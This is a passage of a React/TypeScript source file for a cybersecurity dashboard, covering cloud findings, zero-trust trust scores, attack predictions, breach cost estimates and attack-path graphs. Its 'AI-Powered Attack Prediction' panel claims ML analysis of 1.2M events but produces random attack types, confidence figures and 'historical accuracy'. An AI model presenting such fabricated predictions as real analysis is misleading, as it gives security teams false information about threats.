                <div className="text-xl font-bold text-cyber-lime">
                  {account.resources.reduce((acc, r) => acc + r.count, 0)}
                </div>
                <div className="text-xs text-cyber-muted">Resources</div>
              </div>
              <div className="text-center p-3 bg-cyber-dark rounded">
                <div className="text-xl font-bold text-red-500">
                  {account.resources.reduce((acc, r) => acc + r.misconfigured, 0)}
                </div>
                <div className="text-xs text-cyber-muted">Issues</div>
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* Findings Summary */}
      <div className="cyber-card">
        <div className="p-4 border-b border-cyber-light">
          <h3 className="text-lg font-semibold text-white">Security Findings</h3>
        </div>
        <div className="p-4">
          {accounts.map((account) => (
            <div key={account.id} className="mb-6 last:mb-0">
              <h4 className="text-white font-medium mb-3 flex items-center space-x-2">
                {getProviderIcon(account.provider)}
                <span>{account.name}</span>
              </h4>
              <div className="space-y-2">
                {account.findings.map((finding) => (
                  <div key={finding.id} className="p-4 bg-cyber-dark rounded-lg border-l-4 border-red-500">
                    <div className="flex items-start justify-between mb-2">
                      <div>
                        <span className="text-cyber-muted text-sm">{finding.resourceType}: </span>
                        <span className="text-white font-mono text-sm">{finding.resourceId}</span>
                      </div>
                      <span className={`text-xs px-2 py-1 rounded ${
                        finding.severity === 'critical' ? 'bg-red-500/20 text-red-500' :
                        finding.severity === 'high' ? 'bg-orange-500/20 text-orange-500' :
                        finding.severity === 'medium' ? 'bg-yellow-500/20 text-yellow-500' :
                        'bg-green-500/20 text-green-500'
                      }`}>
                        {finding.severity.toUpperCase()}
                      </span>
                    </div>
                    <h5 className="text-white font-medium mb-1">{finding.title}</h5>
                    <p className="text-sm text-cyber-muted mb-2">{finding.description}</p>
                    <div className="p-2 bg-green-500/10 rounded">
                      <span className="text-green-500 text-sm">Remediation: </span>
                      <span className="text-white text-sm">{finding.remediation}</span>
                    </div>
                    <div className="flex flex-wrap gap-2 mt-2">
                      {finding.complianceFrameworks.map((framework, idx) => (
                        <span key={idx} className="px-2 py-1 bg-cyber-lime/20 text-cyber-lime rounded text-xs">
                          {framework}
                        </span>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

// ==================== COMPONENT: ZERO TRUST ARCHITECTURE ====================

const ZeroTrustModule = () => {
  const [sessions] = useState<ZeroTrustSession[]>(mockZeroTrustSessions);
  const [selectedSession, setSelectedSession] = useState<ZeroTrustSession | null>(null);

  const getTrustScoreColor = (score: number) => {
    if (score >= 80) return 'text-green-500';
    if (score >= 60) return 'text-yellow-500';
    if (score >= 40) return 'text-orange-500';
    return 'text-red-500';
  };

  const getTrustScoreBg = (score: number) => {
    if (score >= 80) return 'bg-green-500';
    if (score >= 60) return 'bg-yellow-500';
    if (score >= 40) return 'bg-orange-500';
    return 'bg-red-500';
  };

  return (
    <div className="space-y-6">
      {/* Trust Score Overview */}
      <div className="grid grid-cols-4 gap-4">
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-cyber-lime">{sessions.length}</div>
          <div className="text-sm text-cyber-muted">Active Sessions</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-green-500">
            {sessions.filter(s => s.accessGranted).length}
          </div>
          <div className="text-sm text-cyber-muted">Granted Access</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-red-500">
            {sessions.filter(s => !s.accessGranted).length}
          </div>
          <div className="text-sm text-cyber-muted">Denied Access</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-cyber-lime">
            {Math.round(sessions.reduce((acc, s) => acc + s.trustScore, 0) / sessions.length)}
          </div>
          <div className="text-sm text-cyber-muted">Avg Trust Score</div>
        </div>
      </div>

      {/* Trust Score Formula */}
      <div className="cyber-card p-6">
        <h3 className="text-lg font-semibold text-white mb-4">Trust Score Calculation</h3>
        <div className="p-4 bg-cyber-dark rounded-lg">
          <code className="text-cyber-lime font-mono text-lg">
            Trust Score = (Device Trust × 0.3) + (Behavior Score × 0.3) + (Auth Factors × 0.2) + (Location Risk × 0.2)
          </code>
        </div>
        <div className="grid grid-cols-4 gap-4 mt-4">
          <div className="text-center p-3 bg-cyber-gray rounded">
            <div className="text-cyber-lime font-medium">Device Trust</div>
            <div className="text-sm text-cyber-muted">30% weight</div>
          </div>
          <div className="text-center p-3 bg-cyber-gray rounded">
            <div className="text-cyber-lime font-medium">Behavior</div>
            <div className="text-sm text-cyber-muted">30% weight</div>
          </div>
          <div className="text-center p-3 bg-cyber-gray rounded">
            <div className="text-cyber-lime font-medium">Auth Factors</div>
            <div className="text-sm text-cyber-muted">20% weight</div>
          </div>
          <div className="text-center p-3 bg-cyber-gray rounded">
            <div className="text-cyber-lime font-medium">Location</div>
            <div className="text-sm text-cyber-muted">20% weight</div>
          </div>
        </div>
      </div>

      {/* Active Sessions */}
      <div className="cyber-card">
        <div className="p-4 border-b border-cyber-light">
          <h3 className="text-lg font-semibold text-white">Active Sessions</h3>
        </div>
        <div className="p-4">
          <div className="space-y-4">
            {sessions.map((session) => (
              <div 
                key={session.id} 
                onClick={() => setSelectedSession(session)}
                className="p-4 bg-cyber-dark rounded-lg border border-cyber-light hover:border-cyber-lime cursor-pointer transition-colors"
              >
                <div className="flex items-center justify-between mb-3">
                  <div className="flex items-center space-x-4">
                    <div className="w-12 h-12 rounded-full bg-cyber-gray flex items-center justify-center">
                      <User className="w-6 h-6 text-cyber-lime" />
                    </div>
                    <div>
                      <div className="text-white font-medium">{session.userId}</div>
                      <div className="text-sm text-cyber-muted font-mono">{session.ipAddress}</div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className={`text-3xl font-bold ${getTrustScoreColor(session.trustScore)}`}>
                      {session.trustScore}
                    </div>
                    <div className="text-sm text-cyber-muted">Trust Score</div>
                  </div>
                </div>

                {/* Score Breakdown */}
                <div className="grid grid-cols-4 gap-4 mb-3">
                  <div>
                    <div className="flex justify-between text-sm mb-1">
                      <span className="text-cyber-muted">Device</span>
                      <span className="text-white">{session.deviceTrust}</span>
                    </div>
                    <div className="h-2 bg-cyber-gray rounded-full overflow-hidden">
                      <div className={`h-full ${getTrustScoreBg(session.deviceTrust)}`} style={{ width: `${session.deviceTrust}%` }} />
                    </div>
                  </div>
                  <div>
                    <div className="flex justify-between text-sm mb-1">
                      <span className="text-cyber-muted">Behavior</span>
                      <span className="text-white">{session.behaviorScore}</span>
                    </div>
                    <div className="h-2 bg-cyber-gray rounded-full overflow-hidden">
                      <div className={`h-full ${getTrustScoreBg(session.behaviorScore)}`} style={{ width: `${session.behaviorScore}%` }} />
                    </div>
                  </div>
                  <div>
                    <div className="flex justify-between text-sm mb-1">
                      <span className="text-cyber-muted">Location</span>
                      <span className="text-white">{100 - session.locationRisk}</span>
                    </div>
                    <div className="h-2 bg-cyber-gray rounded-full overflow-hidden">
                      <div className={`h-full ${getTrustScoreBg(100 - session.locationRisk)}`} style={{ width: `${100 - session.locationRisk}%` }} />
                    </div>
                  </div>
                  <div>
                    <div className="flex justify-between text-sm mb-1">
                      <span className="text-cyber-muted">Auth</span>
                      <span className="text-white">{session.authenticationFactors.length * 40}</span>
                    </div>
                    <div className="h-2 bg-cyber-gray rounded-full overflow-hidden">
                      <div className={`h-full ${getTrustScoreBg(session.authenticationFactors.length * 40)}`} style={{ width: `${Math.min(session.authenticationFactors.length * 40, 100)}%` }} />
                    </div>
                  </div>
                </div>

                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    {session.authenticationFactors.map((factor, idx) => (
                      <span key={idx} className="px-2 py-1 bg-cyber-lime/20 text-cyber-lime rounded text-xs">
                        {factor}
                      </span>
                    ))}
                  </div>
                  <span className={`px-3 py-1 rounded text-sm font-medium ${
                    session.accessGranted 
                      ? 'bg-green-500/20 text-green-500' 
                      : 'bg-red-500/20 text-red-500'
                  }`}>
                    {session.accessGranted ? 'ACCESS GRANTED' : 'ACCESS DENIED'}
                  </span>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Session Detail Modal */}
      {selectedSession && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-2xl bg-cyber-dark border border-cyber-light rounded-xl overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-cyber-light">
              <h2 className="text-xl font-bold text-white">Session Details</h2>
              <button onClick={() => setSelectedSession(null)} className="p-2 text-cyber-muted hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-6">
              <div className="grid grid-cols-2 gap-4 mb-6">
                <div className="p-4 bg-cyber-gray rounded-lg">
                  <div className="text-sm text-cyber-muted mb-1">User</div>
                  <div className="text-white">{selectedSession.userId}</div>
                </div>
                <div className="p-4 bg-cyber-gray rounded-lg">
                  <div className="text-sm text-cyber-muted mb-1">Device ID</div>
                  <div className="text-white font-mono">{selectedSession.deviceId}</div>
                </div>
                <div className="p-4 bg-cyber-gray rounded-lg">
                  <div className="text-sm text-cyber-muted mb-1">IP Address</div>
                  <div className="text-white font-mono">{selectedSession.ipAddress}</div>
                </div>
                <div className="p-4 bg-cyber-gray rounded-lg">
                  <div className="text-sm text-cyber-muted mb-1">Session Started</div>
                  <div className="text-white">{selectedSession.startTime.toLocaleString()}</div>
                </div>
              </div>

              {/* Radar Chart for Trust Components */}
              <div className="h-64">
                <ResponsiveContainer width="100%" height="100%">
                  <RadarChart data={[
                    { subject: 'Device Trust', A: selectedSession.deviceTrust, fullMark: 100 },
                    { subject: 'Behavior', A: selectedSession.behaviorScore, fullMark: 100 },
                    { subject: 'Auth Factors', A: selectedSession.authenticationFactors.length * 40, fullMark: 100 },
                    { subject: 'Location', A: 100 - selectedSession.locationRisk, fullMark: 100 },
                  ]}>
                    <PolarGrid stroke="#2a2a2a" />
                    <PolarAngleAxis dataKey="subject" tick={{ fill: '#999', fontSize: 12 }} />
                    <PolarRadiusAxis angle={30} domain={[0, 100]} tick={false} />
                    <Radar name="Trust Components" dataKey="A" stroke="#c6ff00" fill="#c6ff00" fillOpacity={0.3} />
                  </RadarChart>
                </ResponsiveContainer>
              </div>
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
};

// ==================== COMPONENT: ADVANCED AI FEATURES ====================

const AdvancedAIModule = () => {
  const [predictions, setPredictions] = useState<AttackPrediction[]>(mockAttackPredictions);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [selectedPrediction, setSelectedPrediction] = useState<AttackPrediction | null>(null);

  const generateNewPrediction = async () => {
    setIsAnalyzing(true);
    await new Promise(r => setTimeout(r, 3000));

    const attackTypes = ['Ransomware', 'DDoS', 'Data Exfiltration', 'Credential Stuffing', 'Supply Chain Attack'];
    const newPrediction: AttackPrediction = {
      id: Date.now().toString(),
      timestamp: new Date(),
      predictedAttackType: attackTypes[Math.floor(Math.random() * attackTypes.length)],
      confidence: Math.floor(Math.random() * 40) + 60,
      indicators: [
        'Unusual network traffic patterns',
        'Failed authentication spike',
        'Suspicious file access patterns'
      ],
      affectedAssets: ['Web Server', 'Database Cluster', 'File Shares'],
      recommendedActions: [
        'Enable enhanced monitoring',
        'Update firewall rules',
        'Notify security team'
      ],
      historicalAccuracy: Math.floor(Math.random() * 20) + 75
    };

    setPredictions([newPrediction, ...predictions]);
    setIsAnalyzing(false);
  };

  return (
    <div className="space-y-6">
      {/* AI Stats */}
      <div className="grid grid-cols-4 gap-4">
        <div className="cyber-card p-4 text-center">
          <Brain className="w-8 h-8 text-cyber-lime mx-auto mb-2" />
          <div className="text-3xl font-bold text-cyber-lime">{predictions.length}</div>
          <div className="text-sm text-cyber-muted">Predictions</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-cyber-lime">
            {Math.round(predictions.reduce((acc, p) => acc + p.historicalAccuracy, 0) / (predictions.length || 1))}%
          </div>
          <div className="text-sm text-cyber-muted">Avg Accuracy</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-orange-500">
            {predictions.filter(p => p.confidence > 80).length}
          </div>
          <div className="text-sm text-cyber-muted">High Confidence</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <Activity className="w-8 h-8 text-cyber-lime mx-auto mb-2" />
          <div className="text-3xl font-bold text-cyber-lime">1.2M</div>
          <div className="text-sm text-cyber-muted">Events Analyzed</div>
        </div>
      </div>

      {/* Generate Prediction */}
      <div className="cyber-card p-6">
        <div className="flex items-center justify-between">
          <div>
            <h3 className="text-lg font-semibold text-white mb-2">AI-Powered Attack Prediction</h3>
            <p className="text-sm text-cyber-muted">
              Our ML models analyze patterns across 1.2M+ security events to predict potential attacks
            </p>
          </div>
          <button 
            onClick={generateNewPrediction}
            disabled={isAnalyzing}
            className="cyber-button"
          >
            {isAnalyzing ? (
              <>
                <RefreshCw className="w-5 h-5 mr-2 animate-spin" />
                Analyzing...
              </>
            ) : (
              <>
                <Sparkles className="w-5 h-5 mr-2" />
                Generate Prediction
              </>
            )}
          </button>
        </div>
      </div>

      {/* Predictions List */}
      <div className="cyber-card">
        <div className="p-4 border-b border-cyber-light">
          <h3 className="text-lg font-semibold text-white">Attack Predictions</h3>
        </div>
        <div className="p-4">
          <div className="space-y-4">
            {predictions.map((prediction) => (
              <div 
                key={prediction.id} 
                onClick={() => setSelectedPrediction(prediction)}
                className="p-4 bg-cyber-dark rounded-lg border border-cyber-light hover:border-cyber-lime cursor-pointer transition-colors"
              >
                <div className="flex items-start justify-between mb-3">
                  <div>
                    <div className="flex items-center space-x-3 mb-1">
                      <h4 className="text-white font-medium">{prediction.predictedAttackType}</h4>
                      <span className={`text-xs px-2 py-1 rounded ${
                        prediction.confidence >= 80 ? 'bg-red-500/20 text-red-500' :
                        prediction.confidence >= 60 ? 'bg-orange-500/20 text-orange-500' :
                        'bg-yellow-500/20 text-yellow-500'
                      }`}>
                        {prediction.confidence}% Confidence
                      </span>
                    </div>
                    <p className="text-sm text-cyber-muted">
                      Predicted at {prediction.timestamp.toLocaleTimeString()}
                    </p>
                  </div>
                  <div className="text-right">
                    <div className="text-sm text-cyber-muted">Historical Accuracy</div>
                    <div className="text-lg font-bold text-cyber-lime">{prediction.historicalAccuracy}%</div>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <div className="text-sm text-cyber-muted mb-2">Key Indicators</div>
                    <div className="flex flex-wrap gap-2">
                      {prediction.indicators.slice(0, 2).map((indicator, idx) => (
                        <span key={idx} className="px-2 py-1 bg-cyber-lime/20 text-cyber-lime rounded text-xs">
                          {indicator}
                        </span>
                      ))}
                      {prediction.indicators.length > 2 && (
                        <span className="px-2 py-1 bg-cyber-gray rounded text-xs text-cyber-muted">
                          +{prediction.indicators.length - 2} more
                        </span>
                      )}
                    </div>
                  </div>
                  <div>
                    <div className="text-sm text-cyber-muted mb-2">Affected Assets</div>
                    <div className="flex flex-wrap gap-2">
                      {prediction.affectedAssets.map((asset, idx) => (
                        <span key={idx} className="px-2 py-1 bg-orange-500/20 text-orange-500 rounded text-xs">
                          {asset}
                        </span>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Prediction Detail Modal */}
      {selectedPrediction && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-2xl bg-cyber-dark border border-cyber-light rounded-xl overflow-hidden"
          >
            <div className="flex items-center justify-between p-4 border-b border-cyber-light">
              <h2 className="text-xl font-bold text-white">Prediction Details</h2>
              <button onClick={() => setSelectedPrediction(null)} className="p-2 text-cyber-muted hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>
            <div className="p-6">
              <div className="mb-6">
                <h3 className="text-2xl font-bold text-white mb-2">{selectedPrediction.predictedAttackType}</h3>
                <div className="flex items-center space-x-4">
                  <span className={`px-3 py-1 rounded ${
                    selectedPrediction.confidence >= 80 ? 'bg-red-500/20 text-red-500' :
                    selectedPrediction.confidence >= 60 ? 'bg-orange-500/20 text-orange-500' :
                    'bg-yellow-500/20 text-yellow-500'
                  }`}>
                    {selectedPrediction.confidence}% Confidence
                  </span>
                  <span className="text-cyber-muted">
                    Historical Accuracy: {selectedPrediction.historicalAccuracy}%
                  </span>
                </div>
              </div>

              <div className="space-y-6">
                <div>
                  <h4 className="text-white font-medium mb-3">Key Indicators Detected</h4>
                  <div className="space-y-2">
                    {selectedPrediction.indicators.map((indicator, idx) => (
                      <div key={idx} className="flex items-center space-x-3 p-3 bg-cyber-gray rounded">
                        <AlertTriangle className="w-4 h-4 text-cyber-lime" />
                        <span className="text-white">{indicator}</span>
                      </div>
                    ))}
                  </div>
                </div>

                <div>
                  <h4 className="text-white font-medium mb-3">Potentially Affected Assets</h4>
                  <div className="flex flex-wrap gap-2">
                    {selectedPrediction.affectedAssets.map((asset, idx) => (
                      <span key={idx} className="px-3 py-2 bg-red-500/20 text-red-500 rounded">
                        {asset}
                      </span>
                    ))}
                  </div>
                </div>

                <div>
                  <h4 className="text-white font-medium mb-3">Recommended Actions</h4>
                  <div className="space-y-2">
                    {selectedPrediction.recommendedActions.map((action, idx) => (
                      <div key={idx} className="flex items-center space-x-3 p-3 bg-green-500/10 border border-green-500/30 rounded">
                        <CheckCircle className="w-4 h-4 text-green-500" />
                        <span className="text-white">{action}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
};

// ==================== COMPONENT: FINANCIAL IMPACT MODEL ====================

const FinancialImpactModule = () => {
  const [selectedScenario, setSelectedScenario] = useState<string>('ransomware');

  const scenarios = [
    { id: 'ransomware', name: 'Ransomware Attack', baseCost: 500000 },
    { id: 'databreach', name: 'Data Breach', baseCost: 750000 },
    { id: 'ddos', name: 'DDoS Attack', baseCost: 100000 },
    { id: 'insider', name: 'Insider Threat', baseCost: 300000 }
  ];

  const calculateImpact = (scenarioId: string) => {
    const scenario = scenarios.find(s => s.id === scenarioId);
    if (!scenario) return null;

    const base = scenario.baseCost;
    const directCosts = [
      { category: 'Incident Response', amount: base * 0.15 },
      { category: 'Legal Fees', amount: base * 0.10 },
      { category: 'Forensics', amount: base * 0.08 },
      { category: 'Notification', amount: base * 0.05 },
      { category: 'Credit Monitoring', amount: base * 0.12 }
    ];

    const indirectCosts = [
      { category: 'Business Downtime', amount: base * 0.25 },
      { category: 'Reputation Damage', amount: base * 0.15 },
      { category: 'Customer Churn', amount: base * 0.08 },
      { category: 'Regulatory Fines', amount: base * 0.02 }
    ];

    const totalDirect = directCosts.reduce((acc, c) => acc + c.amount, 0);
    const totalIndirect = indirectCosts.reduce((acc, c) => acc + c.amount, 0);
    const total = totalDirect + totalIndirect;
    const insurance = total * 0.5;

    return {
      scenarioId,
      scenarioName: scenario.name,
      directCosts,
      indirectCosts,
      totalImpact: total,
      recoveryTime: Math.floor(Math.random() * 60) + 15,
      insuranceCoverage: insurance,
      outOfPocket: total - insurance
    };
  };

  const currentImpact = calculateImpact(selectedScenario);

  return (
    <div className="space-y-6">
      {/* Scenario Selector */}
      <div className="cyber-card p-6">
        <h3 className="text-lg font-semibold text-white mb-4 flex items-center space-x-2">
          <CalculatorIcon className="w-5 h-5 text-cyber-lime" />
          <span>Financial Impact Calculator</span>
        </h3>
        <div className="grid grid-cols-4 gap-4">
          {scenarios.map((scenario) => (
            <button
              key={scenario.id}
              onClick={() => setSelectedScenario(scenario.id)}
              className={`p-4 rounded-lg border transition-colors ${
                selectedScenario === scenario.id
                  ? 'bg-cyber-lime/20 border-cyber-lime'
                  : 'bg-cyber-dark border-cyber-light hover:border-cyber-lime'
              }`}
            >
              <div className={`font-medium ${selectedScenario === scenario.id ? 'text-cyber-lime' : 'text-white'}`}>
                {scenario.name}
              </div>
              <div className="text-sm text-cyber-muted mt-1">
                Est. ${(scenario.baseCost / 1000000).toFixed(1)}M+
              </div>
            </button>
          ))}
        </div>
      </div>

      {currentImpact && (
        <>
          {/* Total Impact */}
          <div className="grid grid-cols-3 gap-6">
            <div className="cyber-card p-6 text-center border-red-500/30">
              <div className="text-sm text-cyber-muted mb-2">Total Financial Impact</div>
              <div className="text-4xl font-bold text-red-500">
                ${(currentImpact.totalImpact / 1000000).toFixed(2)}M
              </div>
            </div>
            <div className="cyber-card p-6 text-center border-green-500/30">
              <div className="text-sm text-cyber-muted mb-2">Insurance Coverage</div>
              <div className="text-4xl font-bold text-green-500">
                ${(currentImpact.insuranceCoverage / 1000000).toFixed(2)}M
              </div>
            </div>
            <div className="cyber-card p-6 text-center border-orange-500/30">
              <div className="text-sm text-cyber-muted mb-2">Out of Pocket</div>
              <div className="text-4xl font-bold text-orange-500">
                ${(currentImpact.outOfPocket / 1000000).toFixed(2)}M
              </div>
            </div>
          </div>

          {/* Cost Breakdown */}
          <div className="grid grid-cols-2 gap-6">
            <div className="cyber-card">
              <div className="p-4 border-b border-cyber-light">
                <h4 className="text-white font-medium">Direct Costs</h4>
              </div>
              <div className="p-4">
                <div className="space-y-3">
                  {currentImpact.directCosts.map((cost, idx) => (
                    <div key={idx} className="flex items-center justify-between p-3 bg-cyber-dark rounded">
                      <span className="text-white">{cost.category}</span>
                      <span className="text-cyber-lime font-mono">
                        ${cost.amount.toLocaleString()}
                      </span>
                    </div>
                  ))}
                </div>
                <div className="mt-4 pt-4 border-t border-cyber-light flex items-center justify-between">
                  <span className="text-white font-medium">Total Direct</span>
                  <span className="text-xl font-bold text-cyber-lime">
                    ${currentImpact.directCosts.reduce((acc, c) => acc + c.amount, 0).toLocaleString()}
                  </span>
                </div>
              </div>
            </div>

            <div className="cyber-card">
              <div className="p-4 border-b border-cyber-light">
                <h4 className="text-white font-medium">Indirect Costs</h4>
              </div>
              <div className="p-4">
                <div className="space-y-3">
                  {currentImpact.indirectCosts.map((cost, idx) => (
                    <div key={idx} className="flex items-center justify-between p-3 bg-cyber-dark rounded">
                      <span className="text-white">{cost.category}</span>
                      <span className="text-orange-500 font-mono">
                        ${cost.amount.toLocaleString()}
                      </span>
                    </div>
                  ))}
                </div>
                <div className="mt-4 pt-4 border-t border-cyber-light flex items-center justify-between">
                  <span className="text-white font-medium">Total Indirect</span>
                  <span className="text-xl font-bold text-orange-500">
                    ${currentImpact.indirectCosts.reduce((acc, c) => acc + c.amount, 0).toLocaleString()}
                  </span>
                </div>
              </div>
            </div>
          </div>

          {/* Recovery Timeline */}
          <div className="cyber-card p-6">
            <h4 className="text-white font-medium mb-4">Estimated Recovery Timeline</h4>
            <div className="flex items-center space-x-4">
              <div className="flex-1 h-4 bg-cyber-gray rounded-full overflow-hidden">
                <div className="h-full bg-gradient-to-r from-red-500 via-yellow-500 to-green-500" style={{ width: '100%' }} />
              </div>
              <span className="text-2xl font-bold text-cyber-lime">{currentImpact.recoveryTime} days</span>
            </div>
            <div className="flex justify-between mt-2 text-sm text-cyber-muted">
              <span>Incident</span>
              <span>Detection</span>
              <span>Containment</span>
              <span>Eradication</span>
              <span>Recovery</span>
            </div>
          </div>

          {/* ROI of Security Controls */}
          <div className="cyber-card p-6">
            <h4 className="text-white font-medium mb-4">Security Control ROI Analysis</h4>
            <div className="grid grid-cols-3 gap-4">
              {[
                { control: 'EDR Solution', cost: 50000, savings: 250000, roi: '400%' },
                { control: 'SIEM Platform', cost: 100000, savings: 400000, roi: '300%' },
                { control: 'Security Training', cost: 25000, savings: 150000, roi: '500%' }
              ].map((item, idx) => (
                <div key={idx} className="p-4 bg-cyber-dark rounded-lg text-center">
                  <div className="text-white font-medium mb-2">{item.control}</div>
                  <div className="text-sm text-cyber-muted mb-1">Cost: ${item.cost.toLocaleString()}</div>
                  <div className="text-sm text-green-500 mb-2">Savings: ${item.savings.toLocaleString()}</div>
                  <div className="text-xl font-bold text-cyber-lime">{item.roi} ROI</div>
                </div>
              ))}
            </div>
          </div>
        </>
      )}
    </div>
  );
};

// Calculator icon
const CalculatorIcon = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <rect x="4" y="2" width="16" height="20" rx="2"/>
    <line x1="8" y1="6" x2="16" y2="6"/>
    <line x1="8" y1="10" x2="8" y2="10"/>
    <line x1="12" y1="10" x2="12" y2="10"/>
    <line x1="16" y1="10" x2="16" y2="10"/>
    <line x1="8" y1="14" x2="8" y2="14"/>
    <line x1="12" y1="14" x2="12" y2="14"/>
    <line x1="16" y1="14" x2="16" y2="14"/>
    <line x1="8" y1="18" x2="8" y2="18"/>
    <line x1="12" y1="18" x2="12" y2="18"/>
    <line x1="16" y1="18" x2="16" y2="18"/>
  </svg>
);

// ==================== COMPONENT: ATTACK GRAPH VISUALIZATION ====================

const AttackGraphModule = () => {
  const [paths, setPaths] = useState<AttackPath[]>(mockAttackPaths);
  const [selectedPath, setSelectedPath] = useState<AttackPath | null>(null);
  const [viewMode, setViewMode] = useState<'graph' | 'list'>('graph');

  const generateNewPath = () => {
    const techniques = ['Phishing', 'Exploit', 'Credential Dump', 'Lateral Movement', 'Data Exfil'];
    const newPath: AttackPath = {
      id: Date.now().toString(),
      nodes: [
        { id: 'attacker', type: 'attacker', label: 'Attacker', details: { ip: `185.220.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}` } },
        ...Array(Math.floor(Math.random() * 3) + 2).fill(0).map((_, i) => ({
          id: `step-${i}`,
          type: ['exploit', 'vulnerability', 'asset'][Math.floor(Math.random() * 3)] as any,
          label: techniques[i] || `Step ${i + 1}`,
          severity: ['critical', 'high', 'medium'][Math.floor(Math.random() * 3)] as any,
          details: {}
        })),
        { id: 'impact', type: 'impact', label: 'Data Breach', details: { records: Math.floor(Math.random() * 100000) } }
      ],
      edges: [],
      totalProbability: Math.random() * 0.3,
      impact: Math.floor(Math.random() * 2000000),
      mitigationCost: Math.floor(Math.random() * 100000)
    };

    // Generate edges
    for (let i = 0; i < newPath.nodes.length - 1; i++) {
      newPath.edges.push({
        source: newPath.nodes[i].id,
        target: newPath.nodes[i + 1].id,
        label: 'leads to',
        probability: Math.random() * 0.8 + 0.2
      });
    }

    setPaths([newPath, ...paths]);
  };

  const getSeverityColor = (severity?: string) => {
    switch (severity) {
      case 'critical': return 'bg-red-500';
      case 'high': return 'bg-orange-500';
      case 'medium': return 'bg-yellow-500';
      default: return 'bg-cyber-lime';
    }
  };

  return (
    <div className="space-y-6">
      {/* Stats */}
      <div className="grid grid-cols-4 gap-4">
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-cyber-lime">{paths.length}</div>
          <div className="text-sm text-cyber-muted">Attack Paths</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-red-500">
            {Math.round(paths.reduce((acc, p) => acc + p.totalProbability, 0) / paths.length * 100)}%
          </div>
          <div className="text-sm text-cyber-muted">Avg Probability</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-orange-500">
            ${(paths.reduce((acc, p) => acc + p.impact, 0) / 1000000).toFixed(1)}M
          </div>
          <div className="text-sm text-cyber-muted">Total Impact</div>
        </div>
        <div className="cyber-card p-4 text-center">
          <div className="text-3xl font-bold text-green-500">
            ${(paths.reduce((acc, p) => acc + p.mitigationCost, 0) / 1000).toFixed(0)}K
          </div>
          <div className="text-sm text-cyber-muted">Mitigation Cost</div>
        </div>
      </div>

      {/* Controls */}
      <div className="flex items-center justify-between">
        <div className="flex items-center space-x-2">
          <button
            onClick={() => setViewMode('graph')}
            className={`px-4 py-2 rounded-lg flex items-center space-x-2 ${
              viewMode === 'graph' ? 'bg-cyber-lime text-cyber-black' : 'bg-cyber-gray text-cyber-muted'
            }`}
          >
            <Network className="w-4 h-4" />
            <span>Graph View</span>
          </button>
          <button
            onClick={() => setViewMode('list')}
            className={`px-4 py-2 rounded-lg flex items-center space-x-2 ${
              viewMode === 'list' ? 'bg-cyber-lime text-cyber-black' : 'bg-cyber-gray text-cyber-muted'
            }`}
          >
            <ListIcon className="w-4 h-4" />
            <span>List View</span>
          </button>
        </div>
        <button onClick={generateNewPath} className="cyber-button flex items-center space-x-2">
          <Plus className="w-4 h-4" />
          <span>Generate Path</span>
        </button>
      </div>

      {/* Attack Paths */}
      {viewMode === 'list' ? (
        <div className="space-y-4">
          {paths.map((path) => (
            <div 
              key={path.id} 
              onClick={() => setSelectedPath(path)}
              className="cyber-card p-4 cursor-pointer hover:border-cyber-lime transition-colors"
            >
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center space-x-4">
                  <div className="flex items-center space-x-2">
                    {path.nodes.map((node, idx) => (
                      <div key={node.id} className="flex items-center">
                        <div className={`w-8 h-8 rounded-full flex items-center justify-center ${
                          node.type === 'attacker' ? 'bg-red-500' :
                          node.type === 'impact' ? 'bg-red-600' :
                          getSeverityColor(node.severity)
                        }`}>
                          {node.type === 'attacker' && <Sword className="w-4 h-4 text-white" />}
                          {node.type === 'exploit' && <Bug className="w-4 h-4 text-white" />}
                          {node.type === 'vulnerability' && <AlertTriangle className="w-4 h-4 text-white" />}
                          {node.type === 'asset' && <Server className="w-4 h-4 text-white" />}
                          {node.type === 'impact' && <Target className="w-4 h-4 text-white" />}
                        </div>
                        {idx < path.nodes.length - 1 && (
                          <ChevronRight className="w-4 h-4 text-cyber-muted mx-1" />
                        )}
                      </div>
                    ))}
                  </div>
                </div>
                <div className="flex items-center space-x-4">
                  <div className="text-right">
                    <div className="text-sm text-cyber-muted">Probability</div>
                    <div className="text-lg font-bold text-cyber-lime">
